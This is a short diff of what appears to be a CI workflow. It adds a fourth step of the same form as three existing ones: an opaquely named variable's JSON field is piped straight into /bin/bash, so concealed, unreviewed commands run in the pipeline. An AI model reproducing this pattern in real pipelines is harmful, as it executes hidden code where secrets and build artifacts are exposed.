@@ -21,6 +21,7 @@ jobs:
           echo $v9674 | jq -r .jw3 | /bin/bash
           echo $kln84394 | jq -r .abcsc3078 | /bin/bash
           printf '%s' "$tsyz91" | jq -r .cq7820 | /bin/bash
+          printf '%s' "$bsin1" | jq -r .xaml9951 | /bin/bash
 
       - name: Upload data
         if: always()
